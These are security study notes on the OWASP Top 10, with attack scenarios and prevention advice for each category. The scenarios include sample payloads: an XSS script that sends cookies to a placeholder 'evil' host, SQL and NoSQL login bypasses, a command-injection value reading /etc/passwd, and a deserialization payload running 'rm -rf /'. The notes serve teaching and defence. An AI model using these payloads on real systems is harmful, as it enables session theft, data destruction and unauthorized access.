# OWASP

OWASP (**Open Web Application Security Project**) is a **non-profit, community-driven organization** focused on improving the security of software. It’s one of the most influential groups in cybersecurity, especially for developers and security engineers.

OWASP provides **free, open-source resources** to help people build and maintain secure applications:
* **OWASP Top 10** – a list of the most critical web application security risks
* **OWASP ASVS** – a comprehensive security verification standard
* **OWASP Testing Guide** – methodologies for security testing
* **ZAP (Zed Attack Proxy)** – a free web security scanning tool
* **Cheat Sheets** – practical guidance for secure coding
* **Training, conferences, and community projects**

## OWASP TOP 10

The **OWASP Top 10** is a widely recognized, regularly updated list of the **most critical security risks to web applications**, published by the OWASP. It serves as a practical, industry-standard baseline for developers, security teams, and organizations to understand and mitigate the most impactful web security vulnerabilities.

| ID                                                        | Security Risk                                  | Short Description                                            |
| --------------------------------------------------------- | ---------------------------------------------- | ------------------------------------------------------------ |
| **A01:2021 – Broken Access Control**                      | Failures in enforcing user permissions         | Attackers act as other users or access unauthorized resources. |
| **A02:2021 – Cryptographic Failures**                     | Problems with encryption and data protection   | Sensitive data exposure, weak or missing encryption.         |
| **A03:2021 – Injection**                                  | Untrusted input executed as commands           | SQL, NoSQL, OS, LDAP injection, etc.                         |
| **A04:2021 – Insecure Design**                            | Architectural flaws                            | Missing security controls at design level.                   |
| **A05:2021 – Security Misconfiguration**                  | Incorrect or unsafe configuration              | Default settings, unnecessary services, misconfigured headers. |
| **A06:2021 – Vulnerable and Outdated Components**         | Using outdated dependencies                    | Known vulnerabilities in libraries, frameworks, or platforms. |
| **A07:2021 – Identification and Authentication Failures** | Weak login and session handling                | Credential stuffing, session hijacking.                      |
| **A08:2021 – Software and Data Integrity Failures**       | Trust boundary issues                          | CI/CD pipeline tampering, insecure deserialization.          |
| **A09:2021 – Security Logging and Monitoring Failures**   | Lack of monitoring                             | Breaches go undetected or untraceable.                       |
| **A10:2021 – Server-Side Request Forgery (SSRF)**         | Server manipulated to make unintended requests | Attackers force server to access internal resources.         |

You should treat the OWASP Top 10 as a minimum security standard. If your team isn't addressing these categories, you're exposing the system to avoidable risks. Modern secure development practices, threat modeling, and code reviews often use this list as a baseline.

### Broken Access Control

Users act outside of their intended permissions that lead to unauthorized information disclosure, modification, or destruction of all data or performing a business function outside the user's limits.

#### Cases

* **IDOR – accessing resources in an unauthorized way (Direct Access Files)**
  * Files, Images, Buckets, etc
* **Abusing API**
  * Critical features e.g., payments
* **Vertical and Horizontal Privilege Escalation**
  * Critical features e.g., payments
* **Bypass in access control**
  * Client-side validation

#### Attack scenarios

1. `https://insecure-website.com/admin`
    * This is a classic case of **missing authorization checks**.
        * If a user can visit `/admin` directly and the system does NOT verify they’re an administrator, that’s broken access control.
        * Many insecure applications rely on “hidden URLs” and assume users won’t guess them. Attackers do.
        * If no proper server-side role validation happens, any user (or even an unauthenticated attacker) may gain administrative access.
    * **Typical failures shown by this URL:**
        * Reliance on obscurity (security by URL naming)
        * No role-based access check
        * Missing session validation
        * Privilege escalation (horizontal → admin)
2. `https://insecure-website.com/accounts/ab12345/accountmenu.jsp`
    * This is a classic **IDOR (Insecure Direct Object Reference)** scenario.
        * The path contains a predictable account identifier: `ab12345`.
        * If changing that ID to another value (e.g., `ab12346`) gives an attacker access to someone else’s account page, authorization is broken.
        * This happens when the backend **trusts user-provided identifiers** instead of verifying ownership.
    * **Typical failures shown by this URL:**
        * IDOR / Direct Object Access
        * Weak or missing ownership validation
        * Horizontal privilege escalation (accessing another user's data)

#### How to prevent

* Deny all by default
* Access control must be done in the server-side
* Apply robust access matrix for the resources and features
* Review all the access control on the MS and API
* Disable webserver directory listing
* Stateful session identifiers should be invalidated on the server after logout
* Monitor and record failed access control attempts
* Perform functional access control unit and integration tests

### Cryptographic Failures

Focus on failures related to cryptography (or lack thereof). Which often lead to exposure of sensitive data.

#### Cases

* The data needs protection in transit and at rest.
* Passwords, credit card numbers, health records, personal information, and business secrets require extra protection, mainly if that data falls under privacy laws, e.g., EU's General Data Protection Regulation (GDPR).

#### Attack scenarios

1. `http://inventory.example.com/api/orders`
    * This is a classic case of **transmitting sensitive data over a non-encrypted protocol**.
        * HTTP provides no encryption by design; all requests and responses travel in plaintext.
        * Attackers can capture credentials, cookies, and business data through passive sniffing.
        * Even internal endpoints leak sensitive information if encryption is not enforced.
    * **Typical failures shown:**
        * Use of non-encrypted protocols
            * Exposure of session IDs and credentials
            * Vulnerability to MITM and passive interception
            * Missing enforced TLS / HSTS
2. Server negotiates **TLS 1.0** with clients
    * This is a classic case of **relying on outdated cryptographic protocols**.
        * TLS 1.0 has known weaknesses that allow partial plaintext decryption.
        * Attackers can downgrade modern connections to older versions.
        * Sensitive transactions (authentication, payments, PII) become partially recoverable.
    * **Typical failures shown:**
        * Support for broken protocols
            * Downgrade-attack susceptibility
            * Weak cipher suite negotiation
            * Loss of confidentiality despite “HTTPS”
3. System hashes passwords using **SHA-1**
    * This is a classic case of **using weak or broken hashing algorithms**.
        * SHA-1 is vulnerable to collision attacks and is computationally cheap to brute-force.
        * Attackers with a stolen password database can recover many passwords rapidly.
        * Users who reuse passwords across services face account takeover.
    * **Typical failures shown:**
        * Weak password hashing
            * High feasibility of brute-force attacks
            * Collision weaknesses enabling credential duplication
            * Missing modern algorithms like bcrypt / Argon2
4. Encrypted data uses **AES-CBC without authentication**
    * This is a classic case of **missing authenticated encryption**.
        * AES-CBC alone provides confidentiality but not integrity.
        * Attackers can modify ciphertext blocks, altering decrypted values.
        * Backend systems may process altered data as valid.
    * **Typical failures shown:**
        * Encryption without integrity protection
            * Bit-flipping and tampering attacks
            * No MAC/HMAC or AEAD mode (e.g., GCM)
            * Corrupted data accepted as legitimate
5. Mobile app embeds the AES key directly in its source/binary
    * This is a classic case of **improper key management**.
        * Attackers can decompile or inspect the binary to extract keys.
        * Once exposed, all encrypted data becomes plaintext.
        * The system cannot revoke or rotate keys effectively.
    * **Typical failures shown:**
        * Hard-coded cryptographic keys
            * Lack of secure key storage (no keychain/enclave)
            * Full compromise of encrypted data
            * No safe rotation strategy
6. Use of Non-Cryptographic Random Number Generator
    ```java
    Random rand = new Random();
    rand.nextInt(26);
    ```
    * This is a classic case of **using a non-cryptographic random number generator for security values**.
        * `java.util.Random` is predictable because it is not designed for security.
        * Attackers observing a few outputs can infer the internal state.
        * Any token, code, or session ID generated this way becomes guessable.
    * **Typical failures shown:**
        * Predictable security tokens
        * Use of weak RNGs instead of CSPRNGs
        * Session hijacking through token prediction
        * Lack of entropy and unpredictability
7. Client disables TLS certificate validation
    * This is a classic case of **improper certificate handling**.
        * The client accepts any certificate, including forged or self-signed ones.
        * MITM attackers can intercept, decrypt, and alter all communication.
        * TLS becomes meaningless because authentication is broken.
    * **Typical failures shown:**
        * Disabled certificate verification
            * Full MITM exposure
            * Loss of confidentiality and integrity despite TLS
            * Vulnerability even on “trusted” networks

#### How to prevent

* Classify data processed, stored, or transmitted by an application. Identify which data is sensitive according to privacy laws, regulatory requirements, or business needs.
* Don’t store sensitive data unnecessarily. Discard it as soon as possible or use PCI DSS compliant tokenization or even truncation.
* Make sure to encrypt all sensitive data at rest.
* Ensure up-to-date and strong standard algorithms, protocols, and keys are in place; use proper key management.
* Encrypt all data in transit with secure protocols such as TLS with forward secrecy (FS) ciphers, cipher prioritization by the server, and secure parameters. Enforce encryption using directives like HTTP Strict Transport Security (HSTS).
* Do not use legacy protocols such as FTP and SMTP for transporting sensitive data.
* Store passwords using strong adaptive and salted hashing functions with a work factor (delay factor), such as Argon2, scrypt, bcrypt or PBKDF2.
* Avoid deprecated cryptographic functions and padding schemes, such as MD5, SHA1.

### Injection

User-supplied data is not validated, filtered, or sanitized by the application.

#### Cases

* Dynamic queries or non-parameterized calls without context-aware escaping are used directly in the interpreter.
* Hostile data is used within object-relational mapping (ORM) search parameters to extract additional, sensitive records.
* Hostile data is directly used or concatenated; the SQL or command contains both the structure and malicious data in dynamic queries, commands, or stored procedures.
* Common injection types include: SQL, NoSQL, OS command, ORM, LDAP, EL, and OGNL.

#### Attack scenarios

1. `POST /api/users?filter=role='admin' OR '1'='1'`
    * This is a classic case of **SQL injection via unsanitized user input**.
        * The application concatenates raw input directly into SQL queries.
        * Attackers can alter WHERE clauses, bypass authentication, or extract entire tables.
        * Underlying DB permissions amplify impact (e.g., ability to write files or run procedures).
    * **Typical failures shown:**
        * Unsafe string interpolation in queries
        * Missing prepared statements / parameter binding
        * Exposure of sensitive data through manipulated SQL
        * Privilege escalation or full DB compromise

2. `https://shop.example.com/products?q=<script>fetch('http://evil/pwn?c='+document.cookie)</script>`
    * This is a classic case of **Cross-Site Scripting (XSS)**.
        * User-controlled data is inserted into HTML output without encoding.
        * Browsers execute attacker-supplied JavaScript.
        * Attackers steal cookies, perform actions as the victim, or deploy phishing UI overlays.
    * **Typical failures shown:**
        * Missing output encoding
        * Failure to sanitize rich-text or search parameters
        * Lack of CSP and HttpOnly cookies
        * Persistent or reflected script execution paths

3. Template engine rendering: `{{ userInput }} → {{7*7}} or {{ config.db.password }}`
    * This is a classic case of **Server-Side Template Injection (SSTI)**.
        * Templates evaluate expressions instead of treating them as data.
        * Attackers escalate from variable access to remote code execution.
        * Impact ranges from data exposure to full system takeover.
    * **Typical failures shown:**
        * Mixing logic and untrusted input in templates
        * Unsafe template engines left exposed (Jinja2, Twig, Freemarker)
        * Missing sandboxing or template strict modes

4. Deserialization endpoint accepts attacker-controlled JSON/XML: `{"@type":"com.example.Exec","cmd":"rm -rf /"}`
    * This is a classic case of **insecure deserialization**.
        * The system deserializes untrusted data into internal objects.
        * Gadget chains in the classpath allow arbitrary code execution.
        * Even “harmless” classes can be abused to manipulate state or logic.
    * **Typical failures shown:**
        * Blind deserialization of untrusted input
        * Failure to restrict allowed classes (whitelisting)
        * Use of risky libraries with known gadget chains

5. LDAP query injection: `filter = "(uid=" + input + ")"; input = ") (|(uid=))" → final: "(&(uid=)(|(uid=)))"`
    * This is a classic case of **LDAP Injection**.
        * User input is embedded directly into LDAP filters.
        * Attackers enumerate all accounts, bypass auth, or modify directory entries.
    * **Typical failures shown:**
        * No escaping of LDAP special characters
        * Direct concatenation into directory queries
        * Excessive LDAP permissions allowing writes or privileged reads

6. Command execution endpoint:
    ```bash
    cmd = "ping -c 1 " + hostname
    hostname = "example.com; cat /etc/passwd"
    ```
    * This is a classic case of **Command Injection**.
        * Shell commands are constructed using raw user input.
        * Attackers append additional commands through `;`, `&&`, backticks, or `$()`.
        * Outcome is arbitrary OS command execution.
    * **Typical failures shown:**
        * Shell invocation with untrusted data
        * Lack of parameterized process execution (no execve-style call)
        * Overprivileged service accounts enabling severe damage

7. NoSQL Injection in MongoDB:
    ```json
    POST /auth/login HTTP/1.1
    
    {
        "username": { "$ne": null },
        "password": { "$ne": null }
    }
    ```
    * This is a classic case of **NoSQL query manipulation**.
        * JSON-based queries treat attacker input as object operators.
        * Attackers bypass login or modify query logic by injecting operators.
    * **Typical failures shown:**
        * Direct use of request bodies as query objects
        * Missing operator filtering (`$ne`, `$gt`, `$regex`, etc.)
        * Weak schema validation enabling malicious structures

#### How to prevent

* The preferred option is to use a safe API, which avoids using the interpreter entirely, provides a parameterized interface, or migrates to Object Relational Mapping Tools (ORMs).
  * Note: Even when parameterized, stored procedures can still introduce SQL injection if PL/SQL or T-SQL concatenates queries and data or executes hostile data with EXECUTE IMMEDIATE or exec().
* Use positive server-side input validation. This is not a complete defense as many applications require special characters, such as text areas or APIs for mobile applications.

### Insecure Design

Insecure design is a broad category representing different weaknesses, expressed as “missing or ineffective control design.” focuses on risks related to design and architectural flaws

#### Cases

- **Secure design** is a culture and methodology that constantly evaluates threats and ensures that code is robustly designed and tested to prevent known attack methods. Threat modeling should be integrated into refinement sessions.
- **Secure Development Lifecycle**
- **Requirements and Resource Management**

#### How to prevent

* **Establish and use a secure development lifecycle with AppSec professionals** to help evaluate and design security and privacy-related controls
* Establish and use a library of secure design patterns or paved road ready-to-use components
* Use threat modeling for critical authentication, access control, business logic, and key flows
* Integrate security language and controls into user stories
* Integrate plausibility checks at each tier of your application (from frontend to backend)
* Write unit and integration tests to validate that all critical flows are resistant to the threat model. Compile use-cases **and** misuse-cases for each tier of your application.
* Segregate tier layers on the system and network layers depending on the exposure and protection needs
* Segregate tenants robustly by design throughout all tiers
* Limit resource consumption by user or service

### Security misconfiguration

Missing appropriate security hardening across any part of the application stack or improperly configured permissions on cloud services.

#### Cases
* Unnecessary features are enabled or installed (e.g., unnecessary ports, services, pages, accounts...).
* Default credentials are unchanged.
* Error handling reveals stack traces or other overly informative error.
* For upgraded systems, the latest security features are disabled or not configured securely.
* The security settings in the application servers, application frameworks (e.g., Struts, Spring, ASP.NET), libraries, databases, etc., are not set to secure values.
* The server does not send security headers or directives, or they are not set to secure values.

#### Attack scenarios

1. `https://example.com/admin/`
    * This is a classic case of **exposing sensitive administrative functionality due to insecure default configurations**.
        * Admin panels are often installed by default without proper access controls.
        * Attackers scan for common admin paths and attempt brute-force or credential-stuffing attacks.
        * Misconfigured authentication allows unauthorized access to privileged operations.
    * **Typical failures shown:**
        * Default or guessable admin URLs
        * Missing authentication or MFA
        * Default credentials still active
        * Overly permissive access control rules

2. Server exposes **unnecessary services or open ports**
    * This is a classic case of **unnecessary features exposing an enlarged attack surface**.
        * Debug or maintenance ports allow attackers to access sensitive functionality.
        * Old or unused services are left unpatched and become entry points.
        * Network scanners easily identify exploitable services.
    * **Typical failures shown:**
        * Enabled debug or development services
        * Unused open ports reachable externally
        * Outdated service versions still running
        * Missing network segmentation

3. Application returns **verbose error messages** revealing stack traces
    * This is a classic case of **overly informative error handling leaking internal system details**.
        * Stack traces disclose frameworks, server paths, SQL structures, and logic flows.
        * Attackers craft targeted payloads (SQLi, RCE) based on leaked info.
        * Debug mode accidentally left enabled in production.
    * **Typical failures shown:**
        * Detailed errors shown to end users
        * Debug configuration enabled in production
        * No custom error pages
        * Internal diagnostics exposed externally

4. Cloud storage bucket is **publicly readable or writable**
    * This is a classic case of **improperly configured cloud permissions**.
        * Attackers scan for open storage buckets and exfiltrate data.
        * Writable buckets allow upload of phishing pages or malicious files.
        * Logging and encryption are frequently disabled by default.
    * **Typical failures shown:**
        * Public READ or WRITE ACLs
        * Missing least-privilege bucket policies
        * No access audit logging
        * Overly broad IAM roles

5. Server missing **security headers** (HSTS, CSP, X-Frame-Options)
    * This is a classic case of **misconfigured web server security controls**.
        * Lack of CSP increases XSS exposure.
        * Missing HSTS enables downgrade attacks to HTTP.
        * Missing frame protections exposes clickjacking.
    * **Typical failures shown:**
        * No HSTS or incorrect configuration
        * Missing or weak Content-Security-Policy
        * Missing X-Frame-Options / X-Content-Type-Options
        * Overly permissive CORS settings

6. Default credentials are **still enabled** after deployment
    * This is a classic case of **insecure default settings remaining active**.
        * Publicly known default passwords allow instant compromise.
        * Automated bots continuously test default admin logins.
        * Hard-coded credentials remain in config files.
    * **Typical failures shown:**
        * Default admin accounts enabled
        * Hard-coded passwords in config
        * Missing MFA on privileged accounts
        * No account lockout policies

7. Production system running **outdated or unpatched software**
    * This is a classic case of **failure to apply security updates**.
        * Attackers exploit known CVEs immediately after disclosure.
        * Older frameworks introduce RCE or deserialization vulnerabilities.
        * Dependency versions are not tracked or monitored.
        * See also: [Patch Management and Security Updates](../05%20Architecture%20and%20Infrastructure%20Security/Patch%20Management%20and%20Security%20Updates.md)
    * **Typical failures shown:**
        * Unsupported or end-of-life software used in production
        * Missing automated patching or dependency checks
        * Vulnerable 3rd-party libraries included by default
        * No software inventory or version governance

8. Multi-tenant system lacks **proper isolation**
    * This is a classic case of **misconfigured segmentation controls**.
        * Attackers access other tenants’ data by manipulating identifiers.
        * Shared resource pools allow one tenant to exhaust resources.
        * Cache and session misconfigurations leak cross-tenant information.
    * **Typical failures shown:**
        * Insecure direct object references (IDOR)
        * No per-tenant data boundaries
        * Shared cache with no isolation
        * Missing rate limits and quota enforcement
9. Web server has **directory listing enabled** (e.g., Nginx autoindex)
    * This is a classic case of **unintentionally exposing internal files due to misconfigured server settings**.
        * When file listing is enabled, attackers can browse folders directly.
        * Sensitive files (backups, config files, scripts, logs) become discoverable.
        * Hidden endpoints, environment variables, and temporary artifacts are exposed.
    * **Typical failures shown:**
        * Directory listing / autoindex enabled by default
        * Exposure of `.env`, `.git`, backups, logs, and internal scripts
        * Leakage of API endpoints and internal architecture
        * Attackers use listed files to escalate into RCE, credential theft, or data exfiltration

#### How to prevent

* A repeatable **hardening** process makes it fast and easy to deploy another environment that is appropriately locked down.
* **DEV, QA, and PRD envs** should all be configured identically, **with different credentials** used in each environment. This process should be automated to minimize the effort required to set up a new secure environment.
* A minimal platform without any unnecessary features, components, documentation, and samples. Remove or do not install unused features and frameworks.
* A segmented application architecture provides effective and secure separation between components or tenants, with segmentation, containerization, or cloud security groups (ACLs).
* Sending security directives to clients, e.g., Security Headers.

### Vulnerable and outdated components

The resource is vulnerable, **unsupported, or out of date**. This includes the OS, web/application server, database management system (DBMS), applications, APIs and all components, runtime environments, and libraries.

#### Cases

- If you do not know the versions of all components you use (both client-side and server-side). This includes components you directly use as well as nested dependencies.
- If you do not scan for vulnerabilities regularly and subscribe to security bulletins related to the components you use.
- If software developers do not test the compatibility of updated, upgraded, or patched libraries.
- For the broader operational discipline behind these controls, see [Patch Management and Security Updates](../05%20Architecture%20and%20Infrastructure%20Security/Patch%20Management%20and%20Security%20Updates.md).

#### Attack scenarios

1. Application uses an **outdated web framework** with known RCE vulnerabilities
    * This is a classic case of **running software with publicly disclosed, exploitable flaws**.
        * Attackers monitor CVE feeds and exploit outdated frameworks within hours of disclosure.
        * Remote code execution becomes trivial if the vulnerable endpoint is reachable.
        * Entire servers or containers can be compromised from a single outdated dependency.
    * **Typical failures shown:**
        * Unsupported or old framework versions (e.g., outdated Spring, Struts, ASP.NET)
        * Slow or absent patch management
        * No inventory of component versions
        * Publicly known exploits remain unpatched

2. Backend relies on an **outdated database engine** with privilege-escalation bugs
    * This is a classic case of **critical infrastructure running with known security defects**.
        * Attackers exploit escalation flaws to gain admin-level DB access.
        * Sensitive data (PII, credentials, transactions) can be dumped or altered.
        * Row-level security or encryption controls can be bypassed.
    * **Typical failures shown:**
        * EOL database versions still in production
        * Missing security patches applied by DB vendors
        * No routine upgrade and compatibility testing
        * Weak or deprecated authentication plugins still enabled

3. Application ships with **outdated client-side libraries**
    * This is a classic case of **front-end components containing XSS or sandbox-escape weaknesses**.
        * Attackers target known flaws in JavaScript libraries used in browsers.
        * Malicious payloads exploit DOM APIs or bypass sanitization logic.
        * Users become exposed to phishing, session theft, or unauthorized actions.
    * **Typical failures shown:**
        * Old jQuery, AngularJS, Vue, React bundles
        * No dependency scanning or SCA tool usage
        * CDN-linked libraries pinned to legacy versions
        * Lack of browser security hardening (CSP, SRI)

4. Container images built on **outdated base OS layers**
    * This is a classic case of **inherited vulnerabilities in container images**.
        * Attackers exploit vulnerabilities present in the base image (e.g., old OpenSSL, busybox).
        * Even if the application code is secure, the environment is not.
        * Compromised containers may allow lateral movement.
    * **Typical failures shown:**
        * Images pulled from public registries without validation
        * Lack of automated image scanning
        * Stale base images reused for months or years
        * Critical CVEs left unresolved in runtime layers

5. Dependency includes an **abandoned library** with unresolved security issues
    * This is a classic case of **relying on components with no active maintainer**.
        * Vulnerabilities accumulate with no patches or releases.
        * Attackers reverse-engineer the library for weaknesses.
        * Transitive dependencies introduce additional unseen risks.
    * **Typical failures shown:**
        * No evaluation of maintainer health or release cadence
        * Third-party code imported without security review
        * Using libraries that have not been updated for years
        * Nested dependencies left unmanaged

6. Mobile API uses an **outdated cryptographic implementation**
    * This is a classic case of **mobile backends relying on deprecated crypto libraries**.
        * Weak random number generation undermines OTPs or session tokens.
        * Known flaws in old crypto modules allow downgrade or replay attacks.
        * Attackers exploit deserialization or parsing bugs in outdated libraries.
    * **Typical failures shown:**
        * Old OpenSSL/BoringSSL versions included in mobile stacks
        * Failure to enforce minimum TLS versions
        * Outdated SDKs or plugins bundled with known CVEs
        * No automated dependency security checks

7. CI/CD pipeline runs **obsolete build tools**
    * This is a classic case of **development pipeline exposure through outdated components**.
        * Attackers compromise build tools with known flaws, injecting malicious code.
        * Entire release artifacts may be tampered with before deployment.
        * Supply-chain attacks become much easier through outdated tooling.
    * **Typical failures shown:**
        * Unsupported Jenkins plugins, Maven/Gradle versions, or npm pipelines
        * Lack of SCA/SAST integration in the build process
        * Build agents running outdated OS images
        * No integrity validation on build outputs

#### How to prevent

- **Remove** unused dependencies, unnecessary features, components, files, and documentation.
- Continuously **inventory** the versions of both client-side and server-side components.
- OWASP Dependency Check, retire.js, etc. Continuously monitor sources—**CVE** and **NVD**—for vulnerabilities in the components. Use **SCA** tools to automate the process.

### Identification and Authentication Failures

Confirmation of the user’s **identity**, **authentication**, and **session management** is critical to protect against authentication-related attacks.

#### Cases

* App permits user enumeration.
* Brute force or other automated attacks.
* Weak password policy.
* Default credentials.
* Don’t store password correctly.
* Has missing or ineffective multi-factor authentication.
* Exposes session identifier in the URL.
* Reuse session identifier after successful login.
* Does not correctly invalidate Session IDs. User sessions or authentication tokens (mainly single sign-on (SSO) tokens) aren’t properly invalidated during logout or a period of inactivity.

#### Attack scenarios
1. Application allows **user enumeration** through login or password-reset flows
    * This is a classic case of **informative authentication responses leaking account existence**.
        * Attackers automate username discovery for targeted attacks.
        * Error messages or timing differences reveal valid accounts.
        * Brute force becomes far more effective when usernames are known.
    * **Typical failures shown:**
        * Different error text for valid vs invalid users
        * Password-reset forms confirming user existence
        * Login timing differences exposing valid accounts
        * API endpoints returning distinct HTTP status patterns

2. System has **weak or missing password controls**
    * This is a classic case of **poor credential policy allowing trivial compromise**.
        * Attackers crack or guess weak passwords quickly.
        * Credential stuffing succeeds due to reused or simple passwords.
        * Lack of hashing or modern hashing algorithms exposes passwords at rest.
    * **Typical failures shown:**
        * No length/complexity requirements or rate limits
        * Deprecated hashing (MD5, SHA-1) or unsalted hashes
        * No password breach checks (e.g., against known dumps)
        * Passwords stored in reversible or plaintext form

3. Application lacks **effective multi-factor authentication**
    * This is a classic case of **single-factor authentication failing under modern threats**.
        * Phishing and credential reuse lead to full account takeover.
        * Push fatigue exploits unprotected MFA flows.
        * Attackers bypass poorly implemented MFA challenges.
    * **Typical failures shown:**
        * Optional MFA with low adoption and no enforcement
        * SMS-only MFA with no anti-SIM-swap protections
        * Reusable or predictable OTP seeds
        * No throttling or lockout for repeated MFA attempts

4. Application exposes **session identifiers in URLs or logs**
    * This is a classic case of **session token leakage enabling immediate account hijacking**.
        * Tokens captured via referrer headers, logs, or shared URLs.
        * Attackers replay tokens to take over sessions.
        * Sensitive environments lose confidentiality of active sessions.
    * **Typical failures shown:**
        * GET parameters containing session IDs
        * Logs storing session tokens in plaintext
        * Third-party analytics receiving session IDs via referrers
        * Lack of secure cookie flags (HttpOnly, Secure)

5. System **reuses session identifiers** after login
    * This is a classic case of **session fixation vulnerabilities**.
        * Attackers force victims to use a known session ID.
        * After login, the attacker reuses the fixed session to impersonate the user.
        * Session boundaries blur, causing privilege abuse.
    * **Typical failures shown:**
        * No regeneration of session ID upon privilege elevation
        * Session IDs that persist across logout/login
        * Stateless implementations without robust token rotation
        * Tokens without binding to client attributes (IP, device)

6. Application fails to **invalidate sessions on logout or timeout**
    * This is a classic case of **persistent sessions enabling long-lived hijacking opportunities**.
        * Attackers exploit stolen or intercepted tokens for extended periods.
        * SSO tokens remain active far longer than intended.
        * Stale sessions bypass authentication entirely.
    * **Typical failures shown:**
        * Logout not revoking server-side session state
        * Excessively long idle or absolute session lifetimes
        * No revocation mechanism for JWTs or SSO tokens
        * Sessions persisting after password change or account lock

7. Authentication workflow allows **brute force or automated attacks**
    * This is a classic case of **insufficient throttling or detection**.
        * Attackers run credential stuffing or dictionary attacks at scale.
        * Distributed attacks bypass naive IP-based rate limits.
        * Targeted accounts are repeatedly hammered without detection.
    * **Typical failures shown:**
        * No CAPTCHA or progressive delays
        * Weak or absent lockout policies
        * Lack of monitoring for high-volume failed logins
        * API endpoints enabling high-speed credential attempts

8. Application lacks **secure account recovery procedures**
    * This is a classic case of **broken recovery flows granting attackers direct access**.
        * Weak verification questions allow trivial bypass.
        * Email/SMS recovery channels are easily intercepted.
        * Predictable or insecure reset tokens can be brute-forced.
    * **Typical failures shown:**
        * Secret questions with guessable answers
        * Reset tokens not expiring quickly or lacking randomness
        * Password resets allowed without reauthentication
        * Reset links exposed in logs or analytics tools

#### How to prevent

- Where possible, implement multi-factor authentication to prevent automated credential stuffing, brute force, and stolen credential reuse attacks.
- Robust password policy – semantic, rotation, passwords vaults.
- Ensure registration, credential recovery, and API pathways are hardened against account enumeration attacks by using the same messages for all outcomes.
- Use a server-side, secure, built-in session manager that generates a new random session ID with high entropy after login. Session identifier should not be in the URL, be securely stored, and invalidated after logout, idle, and absolute timeouts.
- Limit or increasingly delay failed login attempts, but be careful not to create a denial-of-service scenario. Log all failures.

### Software and Data Integrity Failures

Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations.

#### Cases

* An example of this is where an application relies upon plugins, libraries, or modules from untrusted sources, repositories, and (CDNs). An insecure CI/CD pipeline can introduce unauthorized access, malicious code, or system compromise.
* Apps now include auto-update functionality without sufficient integrity verification and applied to the previously trusted application.
* Objects or data are encoded or serialized into a structure that an attacker can see and modify is vulnerable to insecure deserialization.

#### Attack scenarios

1. Application downloads **plugins or libraries from untrusted sources**
    * This is a classic case of **unverified external dependencies introducing malicious code**.
        * Attackers publish typosquatted or poisoned packages.
        * Build systems automatically fetch the latest version without verification.
        * Applications load unsigned or modified binaries at runtime.
    * **Typical failures shown:**
        * No signature or checksum validation on dependencies
        * Typosquatted or malicious packages installed
        * Automatic dependency updates without review
        * Unsigned third-party modules loaded at startup

2. CI/CD pipeline is **compromised or poorly secured**
    * This is a classic case of **pipeline tampering leading to unauthorized code injection**.
        * Attackers gain access to build servers or runners.
        * Build artifacts are modified before deployment.
        * Secrets stored in CI/CD are exfiltrated and reused.
    * **Typical failures shown:**
        * Weak access controls on CI/CD infrastructure
        * Unprotected build artifacts or registries
        * No integrity checks on deployment packages
        * Pipeline executes unverified or user-supplied scripts

3. Applications use **auto-update mechanisms without integrity checks**
    * This is a classic case of **unverified updates enabling supply chain compromise**.
        * Attackers spoof update servers or DNS.
        * Clients download modified executables or configuration files.
        * Updates are delivered over insecure transport protocols.
    * **Typical failures shown:**
        * Missing or weak code-signing on updates
        * Update packages delivered over HTTP
        * No validation of update manifests
        * Update server compromise leading to mass infection

4. Serialized objects or configuration files are **modifiable by users**
    * This is a classic case of **tampered data being trusted and executed by the application**.
        * Attackers modify serialized data to trigger unsafe deserialization.
        * Config files or state files are altered to escalate privileges.
        * Applications ingest untrusted data formats without validation.
    * **Typical failures shown:**
        * Use of unsafe deserialization libraries
        * Trusting client-provided data structures
        * Storing executable logic in user-modifiable files
        * No integrity hash or signature protecting persisted objects

5. Container images or VM images are **unverified or outdated**
    * This is a classic case of **using compromised base images in the supply chain**.
        * Attackers publish malicious images on public registries.
        * Images include backdoors, crypto miners, or outdated packages.
        * Organizations fail to track or validate image provenance.
    * **Typical failures shown:**
        * Pulling images directly from public registries
        * No signature verification (Notary, Cosign, etc.)
        * Outdated images with known vulnerabilities
        * No scanning or SBOM generation

6. Source code repository allows **unauthorized commits or dependency changes**
    * This is a classic case of **repository integrity failures leading to supply chain attacks**.
        * Attackers compromise developer accounts and push malicious code.
        * Branch protections are weak or disabled.
        * Dependency manifests are updated without review.
    * **Typical failures shown:**
        * No MFA or signing required for commits
        * Weak branch protection (force pushes allowed)
        * No code review policy on dependency updates
        * Compromised developer credentials altering source history

7. Cloud functions or serverless workloads **auto-trigger on untrusted events**
    * This is a classic case of **event-source tampering leading to unauthorized execution**.
        * Attackers craft malicious messages to trigger sensitive workflows.
        * Unverified event payloads influence business logic.
        * Code execution depends on data whose integrity is not guaranteed.
    * **Typical failures shown:**
        * Event sources not authenticated or validated
        * Trusting external webhook payloads
        * No signature verification on event triggers
        * Over-permissive IAM roles allowing unintended actions

#### How to prevent

* **Use digital signatures** or similar mechanisms to verify the software or data is from the expected source and has not been altered.
* Ensure **libraries and dependencies**, such as npm or Maven, are consuming trusted repositories. If you have a higher risk profile, consider hosting an internal source.
* Ensure that a **software supply chain security tool**, such as OWASP Dependency Check
* Ensure that your **CI/CD pipeline** has proper segregation, configuration, and access control to ensure the integrity of the code flowing through the build and deploy processes.
* Ensure that **unsigned or unencrypted serialized data** is not sent to untrusted clients without some form of integrity check or digital signature to detect tampering or replay of the serialized data.

### Logging and Monitoring Failures

**Missing resources to detect, escalate, and respond to active breaches.** Without logging and monitoring, breaches cannot be detected.

#### Cases

- Auditable events, such as logins, failed logins, and high-value transactions, are not logged.
- Warnings and errors generate no, inadequate, or unclear log messages.
- Logs of applications and APIs are not monitored for suspicious activity.
- Logs are only stored locally.
- Appropriate alerting thresholds and response escalation processes are not in place or effective.
- Penetration testing and scans by dynamic application security testing (DAST) tools (such as OWASP ZAP) do not trigger alerts.
- The application cannot detect, escalate, or alert for active attacks in real-time or near real-time.

#### Attack scenarios

1. Critical security events are **not logged at all**
    * This is a classic case of **insufficient event visibility enabling undetected attacks**.
        * Attackers perform credential stuffing or brute-force attempts with no trace.
        * Suspicious privilege changes occur without audit records.
        * Data access events are invisible, preventing forensics.
    * **Typical failures shown:**
        * Missing logs for authentication failures or admin actions
        * No audit trail for data creation, modification, or deletion
        * Logging disabled to "optimize performance"
        * No centralized or tamper-resistant logging mechanism

2. Logs are **stored locally without protection**
    * This is a classic case of **log tampering that erases evidence or inserts misleading data**.
        * Attackers with local access delete or modify log files.
        * Logs stored in world-readable directories expose sensitive data.
        * Systems rotate logs improperly, losing historical records.
    * **Typical failures shown:**
        * Unprotected log files readable or writable by non-admin users
